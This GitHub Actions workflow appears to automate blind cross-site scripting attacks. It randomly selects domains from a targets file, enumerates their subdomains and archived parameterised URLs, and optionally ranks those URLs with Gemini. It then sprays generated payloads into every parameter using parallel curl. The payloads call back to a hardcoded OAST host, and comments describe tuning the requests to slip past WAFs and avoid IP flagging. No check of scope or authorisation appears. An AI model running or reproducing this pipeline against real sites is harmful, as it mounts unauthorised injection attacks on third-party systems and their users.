name: "Blind XSS Hunter - Deep Discovery"

on:
  workflow_dispatch:
    inputs:
      target_count:
        description: 'Number of targets'
        required: false
        default: '2'
      use_ai_triage:
        description: 'Use AI to prioritize URLs'
        required: false
        default: true
        type: boolean

jobs:
  bxss-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
      DISCORD_CHECK: ${{ secrets.DISCORD_WEBHOOK }}
      GEMINI_CHECK: ${{ secrets.GEMINI_API_KEY }}
    
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        
      - name: Setup Tools
        run: |
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/tomnomnom/qsreplace@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          pip install --quiet uro google-generativeai
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          mkdir -p tmp results reports

      - name: Deep URL Collection
        shell: bash
        env:
          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
        run: |
          set -euo pipefail
          # 1. Fail-Safe: Initialize files so 'cat' never fails
          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
          
          # 2. Select Targets from targets.txt
          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
          
          while IFS= read -r domain; do
            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
            echo "ðŸŽ¯ Target: $domain"
            
            # 3. Subdomain Discovery
            echo "  âˆŸ Finding subdomains..."
            subfinder -d "$domain" -silent -t 20 >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
            
            # 4. Multi-Level URL Discovery (Top 5 subs to keep it fast)
            tail -n 5 tmp/subs.txt | while read -r sub; do
               echo "  âˆŸ Crawling: $sub"
               (timeout 45s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
               (timeout 45s gau "$sub" --threads 5 --blacklist jpg,png,gif,css --subs 2>/dev/null || true) >> tmp/raw_urls.txt
            done
          done < tmp/active_targets.txt
          
          # 5. Deduplication and Parameter Filtering
          if [[ -s tmp/raw_urls.txt ]]; then
            cat tmp/raw_urls.txt | grep "=" | uro --filters hasparams | head -n 200 > tmp/filtered.txt || true
          fi
          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV

      - name: AI Triage
        if: github.event.inputs.use_ai_triage == true && env.GEMINI_CHECK != ''
        shell: bash
        env:
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
        run: |
          if [[ -s tmp/filtered.txt ]]; then
            python3 ai_triage.py tmp/filtered.txt tmp/
            touch tmp/high_priority.txt tmp/medium_priority.txt
            cat tmp/high_priority.txt tmp/medium_priority.txt | head -n 100 > tmp/final_targets.txt || true
          fi
          # Fallback if AI finds nothing
          [[ ! -s tmp/final_targets.txt && -s tmp/filtered.txt ]] && head -n 50 tmp/filtered.txt > tmp/final_targets.txt || true
          echo "AI_TRIAGE_USED=true" >> $GITHUB_ENV

      - name: Manual Triage Fallback
        if: (github.event.inputs.use_ai_triage == false || env.GEMINI_CHECK == '')
        run: |
          if [[ -s tmp/filtered.txt ]]; then
             grep -Ei "id=|query=|search=|q=|msg=|name=|url=|redirect=|debug=|page=" tmp/filtered.txt > tmp/final_targets.txt || head -n 75 tmp/filtered.txt > tmp/final_targets.txt
          fi
          echo "AI_TRIAGE_USED=false" >> $GITHUB_ENV

      - name: Live Host Verification
        run: |
          if [[ -s tmp/final_targets.txt ]]; then
            # Filter for live hosts only (2xx and 3xx)
            cat tmp/final_targets.txt | httpx -silent -timeout 3 -threads 40 -no-color | cut -d' ' -f1 > tmp/live_urls.txt || true
            [[ -s tmp/live_urls.txt ]] && mv tmp/live_urls.txt tmp/final_targets.txt || echo "No live URLs found"
          fi
          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV

      - name: Injection Phase (WAF Friendly)
        shell: bash
        env:
          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
        run: |
          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt
          
          if [[ ! -s tmp/final_targets.txt ]]; then
            echo "âš ï¸ No targets to inject. Exiting gracefully."
            echo "INJECTIONS_SUCCESS=0" >> $GITHUB_ENV
            echo "PAYLOAD_COUNT=0" >> $GITHUB_ENV
            exit 0
          fi

          mapfile -t PAYLOADS < tmp/payloads.txt
          success_count=0
          
          for i in "${!PAYLOADS[@]}"; do
            payload="${PAYLOADS[$i]}"
            echo "ðŸ’‰ Injecting Variant $((i+1))/${#PAYLOADS[@]}"
            
            # Rate limited: -P 15 (Parallelism) and sleep to avoid WAF blocks
            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 15 curl -sk -L -m 6 -w "%{http_code}\n" -o /dev/null "{}" | grep -cE "^(200|302|403|404)" || echo 0)
            success_count=$((success_count + count))
            
            # Cool-down to prevent IP flagging
            sleep 2
          done
          
          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV
          echo "PAYLOAD_COUNT=${#PAYLOADS[@]}" >> $GITHUB_ENV

      - name: Generate Summary Report
        if: always()
        run: |
          cat > reports/scan_summary.md << EOF
          # ðŸŽ¯ Blind XSS Scan Summary
          **Run ID:** #${{ github.run_number }}
          **Targets Found:** $(wc -l < tmp/subs.txt || echo 0) subdomains
          
          | Metric | Value |
          |--------|-------|
          | Filtered URLs | $URL_FILTERED |
          | Final Selected | $URLS_SELECTED |
          | Successful Req | $INJECTIONS_SUCCESS |
          | AI Triage | $AI_TRIAGE_USED |
          
          ðŸ“¡ **Monitoring OAST:** \`${{ secrets.OAST_URL || 'd51hku...oast.live' }}\`
          EOF

      - name: Send Email Report
        if: always() && env.MAIL_CHECK != ''
        uses: dawidd6/action-send-mail@v3
        with:
          server_address: smtp.gmail.com
          server_port: 465
          secure: true
          username: ${{ secrets.EMAIL_USERNAME }}
          password: ${{ secrets.EMAIL_PASSWORD }}
          subject: "âœ… BXSS Scan #${{ github.run_number }} Complete"
          to: ${{ secrets.EMAIL_USERNAME }}
          from: "BXSS Hunter"
          body: file://reports/scan_summary.md
          convert_markdown: true

      - name: Discord Notification
        if: always() && env.DISCORD_CHECK != ''
        shell: bash
        run: |
          curl -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" \
          -d "{\"content\": \"ðŸš€ **Scan #$GITHUB_RUN_NUMBER Complete.** Success Injections: $INJECTIONS_SUCCESS on $URLS_SELECTED URLs.\"}"
